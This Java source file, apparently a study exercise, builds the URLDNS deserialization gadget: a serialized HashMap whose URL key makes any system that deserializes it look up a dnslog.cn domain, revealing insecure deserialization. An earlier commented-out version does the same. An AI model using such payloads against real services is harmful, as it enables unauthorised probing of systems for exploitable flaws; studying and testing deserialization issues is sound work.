package com.yutao.day7;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class urldnsexp {
    public static void main(String[] args) throws Exception {
        HashMap<URL, String> obj = new HashMap<URL, String>();
        String url = "http://1.l2cbwo.dnslog.cn";
        URL url1 = new URL(url);
        Class clazz = Class.forName("java.net.URL");
        Field field = null;
        field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url1, 123123);//加这句是为了防止干扰，，dns查多了就不回显了
        obj.put(url1, "qwer");
        field.set(url1, -1);

        //序列化
        FileOutputStream fo = new FileOutputStream("urldns.ser");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fo);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        System.out.println("ok");
        FileInputStream fi = new FileInputStream("urldns.ser");
        ObjectInputStream ois = new ObjectInputStream(fi);
        ois.readObject();
        ois.close();
    }
}

//package com.yutao.day7;
//
//import java.io.FileInputStream;
//import java.io.FileOutputStream;
//import java.io.ObjectInputStream;
//import java.io.ObjectOutputStream;
//import java.lang.reflect.Field;
//import java.net.URL;
//import java.net.URLStreamHandler;
//import java.util.HashMap;
//
//public class urldnsexp {
//    public static void main(String[] args) throws Exception {
//
//        HashMap hashmap = new HashMap();
//        URL url = new URL("http://3.vz0wzx.dnslog.cn");
//
//        Field filed = Class.forName("java.net.URL").getDeclaredField("hashCode");
//        filed.setAccessible(true);
////        filed.set(url, 209);
//        hashmap.put(url, 209);
//        filed.set(url, -1);
//
//        try {
//            FileOutputStream fileOutputStream = new FileOutputStream("./dnsser");
//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
//            objectOutputStream.writeObject(hashmap);
//            objectOutputStream.close();
//            fileOutputStream.close();
//
//            FileInputStream fileInputStream = new FileInputStream("./dnsser");
//            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
//            objectInputStream.readObject();
//            objectInputStream.close();
//            fileInputStream.close();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//}
